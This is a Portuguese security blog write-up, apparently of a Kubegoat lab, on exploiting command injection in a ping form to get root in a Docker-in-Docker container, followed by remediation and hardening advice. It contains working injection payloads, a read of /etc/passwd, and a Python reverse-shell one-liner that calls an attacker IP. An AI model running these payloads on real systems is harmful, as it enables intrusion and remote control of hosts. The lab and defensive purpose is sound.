<!DOCTYPE html>
<html lang="pt">
<head><script src="/hannya_tech/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=hannya_tech/livereload" data-no-instant defer></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta name="description" content="Hannya Tech">
  <title>DIND (docker-in-docker) exploitation :: Hannya Tech</title>
  
  
  <link rel="stylesheet" href="/hannya_tech/css/hannya.css">
  
  
  
  
  <link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;600;700&display=swap" rel="stylesheet">
<link rel="stylesheet" href="/hannya_tech/css/hannya.css">
</head>
<body class="">
  <header>
    

<div class="hannya-container" style="display: flex; align-items: center; justify-content: space-between; padding: 1rem 1.25rem;">
  <a href="http://localhost:1313/hannya_tech/" aria-label="Home" style="display: flex; align-items: center; gap: 0.75rem; text-decoration: none;">
    <img src="/hannya_tech/logo.svg" alt="Hannya Tech" style="height: 40px; width: auto;"/>
    <span style="font-weight: 800; font-size: 1.25rem; color: var(--text);">Hannya Tech</span>
  </a>

  <nav style="display: flex; align-items: center; gap: 0.5rem;">
    
      
        <a class="btn ghost" href="/hannya_tech/pesquisa/" style="text-decoration: none;">Pesquisas</a>
      
        <a class="btn ghost" href="/hannya_tech/sobre/" style="text-decoration: none;">Sobre</a>
      
    

    <label for="darkmode-toggle" class="btn ghost" style="cursor: pointer;" title="Alternar tema">
      <input name="darkmode-toggle" id="darkmode-toggle" type="checkbox" style="position: absolute; opacity: 0; pointer-events: none;" aria-label="Alternar tema">
      <span class="icon-sun" style="display: inline-flex;"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
  <circle cx="12" cy="12" r="4"></circle>
  <path d="M12 2v2"></path>
  <path d="M12 20v2"></path>
  <path d="m4.93 4.93 1.41 1.41"></path>
  <path d="m17.66 17.66 1.41 1.41"></path>
  <path d="M2 12h2"></path>
  <path d="M20 12h2"></path>
  <path d="m6.34 17.66-1.41 1.41"></path>
  <path d="m19.07 4.93-1.41 1.41"></path>
</svg></span>
      <span class="icon-moon" style="display: none;"><svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
  <path d="M12 3a6 6 0 0 0 9 9 9 9 0 1 1-9-9Z"></path>
  <path d="M19 3v4"></path>
  <path d="M21 5h-4"></path>
</svg></span>
    </label>
  </nav>
</div>

  </header>

  <main>
    
  <div class="hannya-container" style="max-width: 1300px; padding-left: clamp(1rem, 4vw, 2.5rem); padding-right: clamp(1rem, 4vw, 2.5rem);">
    
    <nav style="margin-bottom: clamp(1.5rem, 3vh, 2rem);">
      <a href="/hannya_tech/pesquisa/" style="color: var(--accent); text-decoration: none; font-weight: 600; display: inline-flex; align-items: center; gap: 0.5rem; transition: gap 0.2s ease;">
        <span>‚Üê</span> Voltar para Pesquisas
      </a>
    </nav>

    
    
    
    
    <div style="width: 100%; height: clamp(250px, 40vh, 400px); border-radius: clamp(12px, 2vw, 20px); overflow: hidden; margin-bottom: clamp(1.5rem, 3vh, 2rem); position: relative; box-shadow: 0 8px 32px rgba(15, 23, 42, 0.12);">
      <img src="/hannya_tech/images/subpesquisa/kubegoat/dind.png" alt="DIND (docker-in-docker) exploitation" style="width: 100%; height: 100%; object-fit: cover;">
      <div style="position: absolute; inset: 0; background: linear-gradient(180deg, transparent 50%, rgba(0,0,0,0.7)); display: flex; align-items: flex-end; padding: clamp(1.25rem, 3vw, 2rem);">
        <div>
          <h1 style="color: white; font-size: clamp(2rem, 4vw, 3rem); font-weight: 800; margin: 0; text-shadow: 0 2px 8px rgba(0,0,0,0.3);">DIND (docker-in-docker) exploitation</h1>
        </div>
      </div>
    </div>
    

    
    <div style="display: flex; flex-wrap: wrap; gap: clamp(0.75rem, 2vw, 1rem); align-items: center; justify-content: center; margin-bottom: clamp(2rem, 4vh, 3rem); padding: clamp(1rem, 2.5vw, 1.5rem); background: var(--card-bg); border: 1px solid var(--border); border-radius: clamp(12px, 2vw, 16px);">
      
      <div style="display: flex; gap: 0.5rem; flex-wrap: wrap;">
        <span class="chip">kubernetes</span><span class="chip">rce</span><span class="chip">command-injection</span><span class="chip">dind</span><span class="chip">python-exploit</span>
      </div>
      
      
      
      <div style="display: flex; align-items: center; gap: 0.5rem; color: var(--muted);">
        <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
          <line x1="16" y1="2" x2="16" y2="6"></line>
          <line x1="8" y1="2" x2="8" y2="6"></line>
          <line x1="3" y1="10" x2="21" y2="10"></line>
        </svg>
        <span>09/01/2026</span>
      </div>
      
    </div>

    
    <article class="whitepaper-content" style="max-width: 1100px; margin: 0 auto; width: 100%;">
      
      
      

      
      <section class="box" style="margin-bottom: clamp(2rem, 4vh, 3rem); padding: clamp(1.5rem, 3vw, 2rem);">
        <h2 style="font-size: 1.75rem; margin-bottom: 1.5rem; display: flex; align-items: center; gap: 0.75rem; border-bottom: 2px solid var(--border); padding-bottom: 0.75rem;">
          <span style="font-size: 1.5rem;">üéØ</span>
          Introdu√ß√£o
        </h2>
        <div class="content" style="line-height: 1.8;">
          <h2 id="introdu√ß√£o">Introdu√ß√£o</h2>
<p>Nesta subpesquisa, analisamos o servi√ßo &ldquo;DevSecOps Offensive Security&rdquo;, que oferece uma funcionalidade de teste de conectividade (Ping). A falta de sanitiza√ß√£o na entrada de dados permitiu a manipula√ß√£o do fluxo de execu√ß√£o do sistema operacional subjacente.</p>
<p>O objetivo foi transformar uma funcionalidade administrativa em um vetor de entrada para obter acesso total ao container, identificando posteriormente que se trata de um ambiente Docker-in-Docker (DIND), o que eleva a severidade do comprometimento.</p>
<h2 id="objetivos">Objetivos</h2>
<ol>
<li>Validar a valida√ß√£o de input do formul√°rio de teste de rede.</li>
<li>Escalar de uma execu√ß√£o de comando simples para uma shell interativa.</li>
<li>Estabelecer persist√™ncia ou acesso reverso (Reverse Shell).</li>
<li>Identificar caracter√≠sticas do ambiente comprometido (DIND).</li>
</ol>
<h2 id="metodologia-de-ataque-red-team">Metodologia de Ataque (Red Team)</h2>
<p>A explora√ß√£o seguiu o fluxo de identifica√ß√£o de <strong>Command Injection</strong>.</p>
<h3 id="1-reconhecimento-e-teste-de-inje√ß√£o">1. Reconhecimento e Teste de Inje√ß√£o</h3>
<p>Inicialmente, o sistema foi testado com uma entrada esperada (<code>10.0.0.60</code>), retornando o resultado padr√£o do comando <code>ping</code>.</p>
<img src="/hannya_tech/images/subpesquisa/kubegoat/dind-1.png" alt="Teste inicial de ping com entrada v√°lida" class="evidencia" />

<p>Em seguida, testamos a concatena√ß√£o de comandos utilizando o delimitador <code>;</code> (ponto e v√≠rgula), comum em sistemas Linux para execu√ß√£o sequencial.</p>
<p><strong>Payload de Teste:</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>127.0.0.1; ls -la
</span></span></code></pre></div><img src="/hannya_tech/images/subpesquisa/kubegoat/dind-2.png" alt="Command injection confirmado com ls -la" class="evidencia" />

<p><strong>Resultado:</strong> O sistema executou o ping e, em seguida, listou os arquivos do diret√≥rio atual (<code>main.go</code>, <code>go.mod</code>, <code>docker-entrypoint.sh</code>), confirmando a vulnerabilidade de <strong>Remote Code Execution (RCE)</strong>.</p>
<h3 id="2-enumera√ß√£o-de-ambiente">2. Enumera√ß√£o de Ambiente</h3>
<p>Para entender o n√≠vel de privil√©gio e os usu√°rios do sistema, injetamos o comando de leitura de arquivos:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-text" data-lang="text"><span style="display:flex;"><span>127.0.0.1; cat /etc/passwd
</span></span></code></pre></div><p><img src="/hannya_tech/images/subpesquisa/kubegoat/dind-3.png" alt="Enumera√ß√£o de usu√°rios via /etc/passwd" class="evidencia" />

A sa√≠da exp√¥s a lista de usu√°rios, incluindo <code>root</code>, <code>daemon</code> e <code>app</code>.</p>
<h3 id="3-explora√ß√£o-reverse-shell">3. Explora√ß√£o (Reverse Shell)</h3>
<p>O objetivo final era obter uma shell interativa.</p>
<ul>
<li><strong>Tentativa 1 (Netcat):</strong> Tentamos usar <code>nc</code>, mas a ferramenta n√£o estava instalada no container.</li>
<li><strong>Tentativa 2 (Python):</strong> Verificamos a exist√™ncia do interpretador Python com <code>127.0.0.1; which python3</code>, confirmando sua localiza√ß√£o em <code>/usr/bin/python3</code>.</li>
</ul>
<img src="/hannya_tech/images/subpesquisa/kubegoat/dind-4.png" alt="Verifica√ß√£o da exist√™ncia do Python3" class="evidencia" />

<p><strong>Execu√ß√£o do Exploit:</strong>
Configuramos um listener na m√°quina atacante (<code>nc -lvnp 4444</code>) e injetamos um script Python <em>one-liner</em> para abrir um socket reverso:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#ae81ff">127.0.0.1</span>; python3 <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;192.168.1.34&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39;</span>
</span></span></code></pre></div><h3 id="4-resultado-acesso-root-obtido">4. Resultado: Acesso Root Obtido</h3>
<p>A conex√£o foi estabelecida com sucesso. Ao executar o comando <code>whoami</code>, confirmamos o acesso como usu√°rio <strong>root</strong>.</p>
<img src="/hannya_tech/images/subpesquisa/kubegoat/dind-6.png" alt="Reverse shell estabelecida com acesso root" class="evidencia" />

<p>A an√°lise posterior do ambiente revelou a presen√ßa de <code>/custom/containerd/containerd.sock</code>, confirmando que este container possui acesso ao daemon do Docker (Docker-in-Docker), abrindo portas para ataques de <em>Container Breakout</em>.</p>
<h2 id="-an√°lise-de-impacto-e-mitiga√ß√£o-blue-team">üõ° An√°lise de Impacto e Mitiga√ß√£o (Blue Team)</h2>
<p>A vulnerabilidade √© classificada como <strong>Cr√≠tica</strong>. O c√≥digo da aplica√ß√£o provavelmente utiliza uma chamada de sistema insegura, como <code>exec(f&quot;ping {ip}&quot;)</code>, passando a string bruta do usu√°rio direto para o kernel.</p>
<h3 id="como-corrigir-remedia√ß√£o-no-c√≥digo">Como Corrigir (Remedia√ß√£o no C√≥digo)</h3>
<ol>
<li><strong>Evite Shell Execution:</strong> Nunca utilize fun√ß√µes como <code>os.system()</code>, <code>exec()</code>, ou <code>shell_exec()</code> com input de usu√°rio.</li>
<li><strong>Use Bibliotecas Seguras:</strong> Utilize bibliotecas que separam o comando dos argumentos.
<ul>
<li><em>Inseguro (Python):</em> <code>os.system(&quot;ping &quot; + user_input)</code></li>
<li><em>Seguro (Python):</em></li>
</ul>
</li>
</ol>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#75715e"># O par√¢metro shell=False impede a inje√ß√£o de operadores como &#34;;&#34; ou &#34;&amp;&amp;&#34;</span>
</span></span><span style="display:flex;"><span>subprocess<span style="color:#f92672">.</span>run([<span style="color:#e6db74">&#34;ping&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;4&#34;</span>, user_input], shell<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
</span></span></code></pre></div><ol start="3">
<li><strong>Sanitiza√ß√£o Rigorosa:</strong> Se o input deve ser um IP, valide se ele corresponde estritamente ao formato de um endere√ßo IP (Regex) antes de processar.</li>
</ol>
<h3 id="como-prevenir-hardening-do-container">Como Prevenir (Hardening do Container)</h3>
<p>Mesmo que a aplica√ß√£o falhe, a infraestrutura deve conter o dano:</p>
<ul>
<li><strong>Imagens Distroless:</strong> O ataque dependeu da exist√™ncia de <code>python3</code> e <code>/bin/sh</code> no container. O uso de imagens &ldquo;Distroless&rdquo; ou m√≠nimas (scratch) removeria essas ferramentas, quebrando a <em>Kill Chain</em> do atacante.</li>
<li><strong>Execute como Non-Root:</strong> O atacante ganhou acesso imediato como <code>root</code>. Configure o <code>Dockerfile</code> ou o <code>SecurityContext</code> do Kubernetes para rodar a aplica√ß√£o como um usu√°rio sem privil√©gios (<code>runAsUser: 1000</code>).</li>
<li><strong>Read-Only Root Filesystem:</strong> For√ßar o sistema de arquivos como somente leitura impede que o atacante baixe ou crie scripts maliciosos no disco.</li>
<li><strong>Network Policies:</strong> Implemente pol√≠ticas de rede para bloquear conex√µes de sa√≠da n√£o autorizadas, dificultando o estabelecimento de reverse shells.</li>
</ul>
<h2 id="-conclus√£o">üìä Conclus√£o</h2>
<p>Esta subpesquisa demonstrou como uma vulnerabilidade aparentemente simples de Command Injection pode escalar rapidamente para um comprometimento total do container com privil√©gios root. A presen√ßa do ambiente Docker-in-Docker amplifica significativamente o risco, permitindo potenciais ataques de container breakout.</p>
<p>A combina√ß√£o de valida√ß√£o rigorosa de entrada, princ√≠pio do menor privil√©gio e hardening de container √© essencial para mitigar essa classe de vulnerabilidades em ambientes Kubernetes.</p>

        </div>
      </section>

      

      
      

      
      

      
      

      
      
    </article>

    
    
    <div style="margin-top: clamp(3rem, 5vh, 4rem); text-align: center; padding: clamp(1.5rem, 3vw, 2rem); background: linear-gradient(135deg, rgba(124, 58, 237, 0.05), rgba(167, 139, 250, 0.05)); border-radius: clamp(12px, 2vw, 16px);">
      
      
      
      <p style="color: var(--muted); margin-bottom: 1rem;">Este whitepaper faz parte de:</p>
      <a href="/hannya_tech/pesquisa/kubegoat/" class="btn primary" style="text-decoration: none; font-size: 1.05rem;">
        <svg width="20" height="20" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
          <path d="M19 12H5M12 19l-7-7 7-7"/>
        </svg>
        Explora√ß√£o e Mitiga√ß√£o de Vulnerabilidades em Kubernetes: Estudo com Kubegoat
      </a>
      
    </div>
    
  </div>

<style>
.whitepaper-content h3 {
  font-size: 1.4rem;
  font-weight: 700;
  margin-top: 2rem;
  margin-bottom: 1rem;
  color: var(--text);
}

.whitepaper-content h4 {
  font-size: 1.2rem;
  font-weight: 600;
  margin-top: 1.5rem;
  margin-bottom: 0.75rem;
  color: var(--text);
}

.whitepaper-content p {
  margin-bottom: 1.25rem;
  line-height: 1.8;
  max-width: 85ch;
}

.whitepaper-content ul,
.whitepaper-content ol {
  margin-left: 1.5rem;
  margin-bottom: 1.25rem;
  line-height: 1.8;
}

.whitepaper-content li {
  margin-bottom: 0.5rem;
}

.whitepaper-content code {
  background: rgba(124, 58, 237, 0.1);
  padding: 0.2rem 0.5rem;
  border-radius: 4px;
  font-size: 0.9em;
  font-family: 'Courier New', monospace;
}

.whitepaper-content pre {
  background: var(--card-bg);
  border: 1px solid var(--border);
  border-radius: 8px;
  padding: 1.5rem;
  overflow-x: auto;
  margin-bottom: 1.5rem;
}

.whitepaper-content blockquote {
  border-left: 4px solid var(--accent);
  padding-left: 1.5rem;
  margin: 1.5rem 0;
  font-style: italic;
  color: var(--muted);
}

.whitepaper-content img {
  max-width: 100%;
  height: auto;
  border-radius: 12px;
  margin: 2rem 0;
  box-shadow: 0 4px 16px rgba(15, 23, 42, 0.1);
}

.whitepaper-content img.evidencia {
  margin-top: 1rem;
  margin-bottom: 2rem;
  border: 1px solid var(--border);
  box-shadow: 0 2px 12px rgba(124, 58, 237, 0.08);
  transition: transform 0.2s ease, box-shadow 0.2s ease;
}

.whitepaper-content img.evidencia:hover {
  transform: translateY(-2px);
  box-shadow: 0 8px 24px rgba(124, 58, 237, 0.15);
}

.whitepaper-content table {
  width: 100%;
  border-collapse: collapse;
  margin: 2rem 0;
}

.whitepaper-content th,
.whitepaper-content td {
  padding: 0.75rem;
  border: 1px solid var(--border);
  text-align: left;
}

.whitepaper-content th {
  background: var(--card-bg);
  font-weight: 700;
}

@media (max-width: 1200px) {
  .whitepaper-content {
    max-width: 100%;
  }
  
  .whitepaper-content p {
    max-width: 100%;
  }
}

@media (max-width: 768px) {
  .hannya-container {
    padding-left: 1.25rem !important;
    padding-right: 1.25rem !important;
  }
  
  .whitepaper-content {
    padding: 0;
  }
  
  .box {
    padding: 1.25rem !important;
    border-radius: 12px !important;
  }
  
  .whitepaper-content h2 {
    font-size: 1.5rem !important;
  }
  
  .whitepaper-content h3 {
    font-size: 1.25rem !important;
  }
  
  .whitepaper-content table {
    font-size: 0.9rem;
  }
}

@media (max-width: 480px) {
  .hannya-container {
    padding-left: 1rem !important;
    padding-right: 1rem !important;
  }
  
  .box {
    padding: 1rem !important;
  }
  
  .whitepaper-content h2 {
    font-size: 1.35rem !important;
  }
  
  .whitepaper-content h3 {
    font-size: 1.15rem !important;
  }
  
  .whitepaper-content h4 {
    font-size: 1.05rem !important;
  }
  
  .whitepaper-content table {
    font-size: 0.85rem;
    display: block;
    overflow-x: auto;
  }
  
  .whitepaper-content pre {
    font-size: 0.85rem;
    padding: 1rem !important;
  }
}
</style>

  </main>

  <footer style="text-align: center; padding: 2rem 1rem; color: var(--muted); border-top: 1px solid var(--border); margin-top: 4rem;">
    <div class="hannya-container">
      <p>&copy; 2026 Hannya Tech. Feito com <a href="https://gohugo.io/" target="_blank" rel="noopener" style="color: var(--accent);">Hugo</a>.</p>
    </div>
  </footer>

  
  <script>
    const toggle = document.getElementById('darkmode-toggle');
    const html = document.documentElement;
    
    
    const currentTheme = localStorage.getItem('theme') || 'light';
    if (currentTheme === 'dark') {
      html.classList.add('dark');
      if (toggle) toggle.checked = true;
    }
    
    if (toggle) {
      toggle.addEventListener('change', function() {
        if (this.checked) {
          html.classList.add('dark');
          localStorage.setItem('theme', 'dark');
        } else {
          html.classList.remove('dark');
          localStorage.setItem('theme', 'light');
        }
      });
    }
  </script>
</body>
</html>
